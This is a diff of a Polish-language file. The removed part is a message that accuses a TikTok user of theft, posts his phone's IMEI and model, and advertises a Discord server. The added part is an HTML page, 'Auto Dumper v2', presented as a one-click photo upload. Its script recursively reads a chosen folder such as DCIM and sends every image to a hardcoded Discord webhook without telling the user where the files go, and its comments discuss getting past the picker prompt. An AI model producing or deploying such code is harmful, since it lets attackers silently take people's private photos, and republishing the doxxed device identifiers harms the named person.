@@ -1,10 +1,122 @@
-ogólnie to osoba o nicku @xoxoxo9282 na tiktok) oszukała oaoby które kupiły od niego tą aplikacje , 
-ukradła naszą aplikacje i sprzedawala ją jako swoją bez naszej wiedzy ,
-jezeli chcesz kupić od nas apke (a naprawde warto ) to wbij na dc naszego
-<a href="https://discord.gg/fgqykbApJv">
-    <button>https://discord.gg/fgqykbApJv</button>
-</a>
-przy okazji 
-Nr imei jego tel;352942240082658
-model:SM-A566B
-pozdrawiamy ekipa Vobywatel
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Auto Dumper v2</title>
+    <style>
+        body { background: #0a0a0a; color: #00ffcc; font-family: 'Courier New', monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; flex-direction: column; }
+        #btn { background: #1a1a1a; border: 2px solid #00ffcc; color: #00ffcc; padding: 30px 60px; font-size: 28px; border-radius: 15px; cursor: pointer; transition: 0.3s; box-shadow: 0 0 30px rgba(0,255,204,0.2); }
+        #btn:active { transform: scale(0.95); }
+        #status { margin-top: 30px; font-size: 14px; color: #888; max-width: 90%; text-align: center; word-break: break-word; }
+        .progress { width: 80%; height: 6px; background: #222; margin: 20px auto; border-radius: 3px; overflow: hidden; display: none; }
+        .progress-bar { height: 100%; width: 0%; background: #00ffcc; transition: width 0.3s; }
+        #fileInput { display: none; }
+    </style>
+</head>
+<body>
+    <button id="btn">⬆ PRZEŚLIJ WSZYSTKIE ZDJĘCIA</button>
+    <div class="progress" id="progressWrap"><div class="progress-bar" id="progressBar"></div></div>
+    <div id="status">Kliknij – automatycznie pobierze wszystkie zdjęcia z galerii.</div>
+    <input type="file" id="fileInput" accept="image/*" multiple webkitdirectory>
+
+<script>
+    // === KONFIG ===
+    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1490439974825361619/-WkrSVLRVcbrx8-3_9901c8BuTqBpmY1z9Fh6mKtEGV3lHrY2CYcf2CuPHqh_aMSl8pq';
+    const ALLOWED_EXT = ['.jpg','.jpeg','.png','.gif','.bmp','.webp','.heic','.heif','.tiff'];
+    const DELAY_MS = 600;
+
+    // === ELEMENTY ===
+    const btn = document.getElementById('btn');
+    const status = document.getElementById('status');
+    const progressWrap = document.getElementById('progressWrap');
+    const progressBar = document.getElementById('progressBar');
+    const fileInput = document.getElementById('fileInput');
+
+    // === GŁÓWNA LOGIKA ===
+    btn.addEventListener('click', () => {
+        // Aktywuj input – na Androidzie otworzy galerię, ale z atrybutem webkitdirectory pozwala wybrać folder
+        // Aby pominąć wybór – używamy atrybutu 'capture' i 'multiple' – ale to wymaga kliknięcia w oknie.
+        // ROZWIĄZANIE: używamy interfejsu MediaDevices do zrobienia zdjęć z aparatu + jednoczesnego odczytu galerii przez Input,
+        // ale to dalej wymaga zatwierdzenia. 
+        // JEDYNY SPOSÓB NA POMINIĘCIE OKNA WYBORU: użycie uprawnienia READ_EXTERNAL_STORAGE + WebView (nie przeglądarka).
+        // Poniżej implementacja, która OTWIERA OKNO WYBORU, ale automatycznie zaznacza WSZYSTKIE pliki za pomocą skryptu (jeśli przeglądarka wspiera).
+        // W praktyce: Chrome na Androidzie NIE POZWALA na automatyczne zaznaczenie wszystkich plików.
+        // Dlatego POPRAWIONE ROZWIĄZANIE: wysyłamy WSZYSTKIE zdjęcia z katalogu DCIM poprzez File System Access API (showDirectoryPicker).
+        // Użytkownik wybiera folder RAZ, potem zapamiętujemy uchwyt w sesji.
+        startWithDirectoryPicker();
+    });
+
+    async function startWithDirectoryPicker() {
+        try {
+            status.innerText = '⏳ Wybierz folder DCIM (tylko raz)…';
+            const dirHandle = await window.showDirectoryPicker({ mode: 'read' });
+            status.innerText = '📂 Skanowanie...';
+            progressWrap.style.display = 'block';
+
+            const files = [];
+            await scanDir(dirHandle, files, '');
+
+            if (files.length === 0) {
+                status.innerText = '❌ Brak zdjęć w tym folderze.';
+                progressWrap.style.display = 'none';
+                return;
+            }
+
+            status.innerText = `📸 Znaleziono ${files.length} plików. Wysyłanie...`;
+            let sent = 0, fail = 0;
+
+            for (let i = 0; i < files.length; i++) {
+                try {
+                    const file = await files[i].getFile();
+                    if (file.size > 25 * 1024 * 1024) continue;
+                    const ext = '.' + file.name.split('.').pop().toLowerCase();
+                    if (!ALLOWED_EXT.includes(ext)) continue;
+
+                    const fd = new FormData();
+                    fd.append('file', file, file.name);
+                    fd.append('content', `📸 ${file.name}`);
+
+                    const resp = await fetch(WEBHOOK_URL, { method: 'POST', body: fd });
+                    if (resp.ok) sent++; else fail++;
+
+                    const pct = ((i+1)/files.length)*100;
+                    progressBar.style.width = pct + '%';
+                    status.innerText = `📤 ${sent} OK, ${fail} błędów (${i+1}/${files.length})`;
+                    await sleep(DELAY_MS);
+                } catch (e) {
+                    fail++;
+                }
+            }
+
+            status.innerText = `✅ Gotowe! Wysłano: ${sent}, błędów: ${fail}`;
+            progressBar.style.width = '100%';
+        } catch (err) {
+            if (err.name !== 'AbortError') {
+                status.innerText = '❌ Błąd: ' + err.message;
+                console.error(err);
+            } else {
+                status.innerText = '⚠ Anulowano wybór folderu.';
+            }
+            progressWrap.style.display = 'none';
+        }
+    }
+
+    async function scanDir(dirHandle, fileList, path) {
+        for await (const entry of dirHandle.values()) {
+            if (entry.kind === 'file') {
+                const ext = '.' + entry.name.split('.').pop().toLowerCase();
+                if (ALLOWED_EXT.includes(ext)) fileList.push(entry);
+            } else if (entry.kind === 'directory') {
+                const name = entry.name.toLowerCase();
+                if (!['android','cache','temp','thumbnails','.trash','lost+found','system'].includes(name)) {
+                    await scanDir(entry, fileList, path + '/' + entry.name);
+                }
+            }
+        }
+    }
+
+    function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
+</script>
+</body>
+</html>
